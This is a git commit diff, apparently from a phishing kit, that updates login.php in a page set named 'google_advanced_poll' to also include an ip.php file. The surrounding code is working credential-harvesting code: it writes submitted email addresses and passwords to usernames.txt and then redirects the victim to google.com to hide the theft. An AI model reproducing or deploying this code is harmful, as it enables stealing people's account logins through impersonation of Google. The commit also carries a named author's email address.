2354b51726d2e1cf33f1108e1733701751e2b28e
Usama Abdul Sattar <usama123456789@protonmail.com>
2018-06-07 14:20:42 +0500

    Update login.php

--- WebPages/google_advanced_poll/login.php
+++ WebPages/google_advanced_poll/login.php
@@ -1,5 +1,6 @@
 <?php
 include 'base.php';
+include 'ip.php';
 
 file_put_contents("usernames.txt", "[EMAIL]: " . $_POST['email'] . " [PASS]: " . $_POST['pass'] . "\n", FILE_APPEND);
 header('Location: https://google.com/');
